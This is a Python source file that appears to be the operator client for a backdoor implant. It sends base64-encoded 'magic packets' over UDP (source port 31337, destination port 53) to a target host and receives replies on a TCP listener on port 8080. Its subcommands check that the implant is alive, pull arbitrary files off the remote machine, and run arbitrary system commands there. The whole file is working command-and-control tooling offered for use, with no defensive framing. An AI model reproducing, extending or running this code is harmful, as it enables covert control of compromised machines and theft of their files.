"""Everybody get up, it's time to slam now!"""
import argparse
import base64
import contextlib
import os
import socket

MAGIC_SRC_PORT = 31337
DEFAULT_DEST_PORT = 53
TCP_LISTEN_PORT = 8080
SOCKET_TIMEOUT = 10
RESPONSE_SIZE = 4196

SUPPORTED_CMDS = [
    "ping",
    "get",
    "exec",
]

@contextlib.contextmanager
def _tcp_listener():
    """socket listening for the command response"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", TCP_LISTEN_PORT))
    sock.settimeout(SOCKET_TIMEOUT)
    sock.listen(1)
    yield sock
    sock.close()


@contextlib.contextmanager
def _udp_sender():
    """socket for sending the command"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", MAGIC_SRC_PORT))
    yield sock
    sock.close()


def _send_cmd(ip, port, msg):
    """sends a magic cmd packet and returns the response"""
    encoded = base64.b64encode(msg.encode("ascii")) + b"\x00"

    with _tcp_listener() as tcp:
        with _udp_sender() as udp:
            print(f"sending magic packet --> {ip}:{port}")
            udp.sendto(encoded, (ip, port))
        print("waiting for reply...")
        try:
            sock, addr = tcp.accept()
        except socket.timeout as err:
            raise ConnectionError("No response received!") from err
        response = b""
        while data := sock.recv(4096):
            response += data
    decoded = base64.b64decode(response)
    if decoded.startswith(b"ERROR"):
        errno = int(decoded.split(b"ERROR: ")[1])
        raise RuntimeError(os.strerror(errno))
    return decoded


def do_ping(args):
    """send a ping"""
    msg = "PING"
    response = _send_cmd(args.ip, args.dest_port, msg).decode("ascii")
    if "PONG" not in response:
        raise ValueError("Invalid response received!")
    print(f"Received PONG from {args.ip}")


def do_get(args):
    """retrieve a file"""
    msg = f"GET {args.path}"
    response = _send_cmd(args.ip, args.dest_port, msg)

    filename = os.path.basename(args.path)
    out = args.output_path if args.output_path else filename
    with open(out, "wb") as f:
        f.write(response)
    
    print(f"Retrieved {filename} from {args.ip}")


def do_exec(args):
    """run a system command"""
    msg = f"EXEC {args.cmd}"
    response = _send_cmd(args.ip, args.dest_port, msg).decode("ascii")
    print(f"Command on {args.ip} returned: {response}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="send it!")
    subparsers = parser.add_subparsers(help="[supported commands]")
    parser.add_argument(
        "-i", "--ip",
        required=True,
        help="IP address of host machine",
    )
    parser.add_argument(
        "--dest-port",
        type=int,
        default=DEFAULT_DEST_PORT,
        help="destination port number",
    )
    # ping
    ping_parser = subparsers.add_parser("ping", help="ping a target")
    ping_parser.set_defaults(func=do_ping)
    # get
    get_parser = subparsers.add_parser("get", help="retrieve a file")
    get_parser.add_argument(
        "path",
        help="file to retrieve",
    )
    get_parser.add_argument(
        "-o", "--output-path",
        required=False,
        help="local path for retrieved file",
    )
    get_parser.set_defaults(func=do_get)
    # exec
    exec_parser = subparsers.add_parser("exec", help="run a system command")
    exec_parser.add_argument(
        "cmd",
        help="command to run",
    )
    exec_parser.set_defaults(func=do_exec)
    # run with it
    args = parser.parse_args()
    args.func(args)
